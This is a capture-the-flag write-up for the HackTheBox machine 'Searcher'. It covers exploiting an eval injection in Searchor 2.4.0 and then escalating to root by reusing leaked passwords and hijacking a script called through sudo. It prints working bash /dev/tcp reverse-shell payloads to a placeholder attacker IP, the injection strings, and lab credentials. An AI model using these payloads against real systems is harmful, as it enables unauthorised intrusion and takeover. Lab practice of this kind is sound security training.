###### Nmap Scan
![[Pasted image 20230711201004.png]]
There is a web service running on port 80.

Leads to the below website searcher.htb with an input form.
![[Pasted image 20230711201234.png]]

At the bottom we see that the website is powered by Flask and Searchor 2.4.0. Following the link for Searchor 2.4.0 leads to a Github repository.
Looking through the repository we find a pull request after the 2.4.0 release of a removed eval function which we know can be vulnerable in python.![[Pasted image 20230711201547.png]]
![[Pasted image 20230711201619.png]]
In the commits tab we find the replaced code which would still be vulnerable in Searchor 2.4.0.
Going back to the website we can exploit the eval function
Set up a netcat listener in the background
`nc -lnvp <PORT>`
and insert a payload: `' + eval("__import__('os').system(\"bash -c 'bash -i >& /dev/tcp/<YOUR-IP-ADDRESS>/<PORT OF LISTENER> 0>&1'\")") + '`
Another payload: `', __import__('os').system('bash -c "bash -i >& /dev/tcp/<YOUR-IP-ADDRESS>/<PORT OF LISTENER> 0>&1"')) # comment`

Stabilize the shell using python python - c "import pty;  pty.spawn('/bin/bash')" Ctrl + Z stty raw echo; fg < Enter > export TERM=xterm

Now we're in!
![[Pasted image 20230711203535.png]]
##### Privesc
We can tell Apache is running on the website through wappalyzer so we can take a look at the config files.
![[Pasted image 20230711204443.png]]
There is another virtual host served on gitea.searcher.htb.
![[Pasted image 20230711204552.png]]
We can see a login page also.
![[Pasted image 20230711204617.png]]
However, we don't have any credentials at this time. So let's find some.
![[Pasted image 20230711204807.png]]
There is a config file inside of the directory for the website.
![[Pasted image 20230711204923.png]]
We have credentials! cody:jh1usoih2bkjaspwe92
![[Pasted image 20230711205019.png]]
We logged in with cody.
However, nothing on this site seems too appealing.
Let's try this password for the svc user since it seems like this person might be the same as they both worked on searcher.htb.
![[Pasted image 20230711205215.png]]
It worked. Now we can run commands like sudo -l to enumerate our sudo privileges and see what we can run as root to escalate our privileges.
![[Pasted image 20230711205359.png]]
`usr/bin/python3 /opt/scripts/system-checkup.py *`
We can run this command as root.
Running the command prompts this:
![[Pasted image 20230711205539.png]]
Let's enumerate.
![[Pasted image 20230711205614.png]]
mysql database docker container and gitea docker container
Seems like these options are just running the docker commands...
![[Pasted image 20230711210011.png]]
Now we have credentials for root and gitea.
Let's try to use these passwords to log into the other user we saw on the gitea site, administrator.
![[Pasted image 20230711210311.png]]
The password for gitea worked.
administrator:yuiu1hoiu4i5ho1uh

Now we can inspect the source code for all of these scripts that we are able to run with root privileges. 
![[Pasted image 20230711210459.png]]
We can see in full-checkup that it runs the command ./full-checkup.sh which means we can exploit this by writing our own full-checkup.sh in tmp and running the command from the tmp folder.
```
echo -e '#!/bin/bash\n bash -c "bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1"' > /tmp/full-checkup.sh
cd /tmp
chmod 777 full-checkup.sh
sudo python3 /opt/scripts/system-checkup.py full-checkup
```
![[Pasted image 20230711211732.png]]
ROOOOOOTED!
